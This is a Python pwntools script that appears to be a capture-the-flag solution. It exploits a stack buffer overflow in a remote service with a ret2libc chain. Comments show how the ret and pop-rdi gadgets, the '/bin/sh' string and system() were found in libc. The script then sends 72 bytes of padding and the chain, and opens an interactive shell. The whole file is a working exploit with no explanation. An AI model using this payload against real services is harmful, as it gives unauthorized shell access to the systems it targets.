#!/bin/python

from pwn import *

p = remote('0.0.0.0', 31340)
#p = process("./task")

# ldd task
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7d90000)

# ropper --file libc.so.6 --search "ret;"
# 0x0000000000029cd6: ret;

ptr_RET = 0x00007ffff7d90000 + 0x0000000000029cd6

# ropper --file libc.so.6 --search "pop rdi; ret;"
# 0x000000000002a3e5: pop rdi; ret;

ptr_POPRDI_RET = 0x00007ffff7d90000 + 0x000000000002a3e5

# strings -a -t x ./libc.so.6 | grep "/bin/sh"
# 1d8698 /bin/sh

ptr_BIN_SH = 0x00007ffff7d90000 + 0x1d8698

# objdump -T libc.so.6 | grep system
# 0000000000050d60  w   DF .text	000000000000002d  GLIBC_2.2.5 system

ptr_SYSTEM = 0x00007ffff7d90000 + 0x50d60

payload2 = ("A"*72).encode()
payload2 += p64(ptr_RET)
payload2 += p64(ptr_POPRDI_RET)
payload2 += p64(ptr_BIN_SH)
payload2 += p64(ptr_SYSTEM)

p.recvuntil("buffer: ")

p.sendline(payload2)

p.interactive()
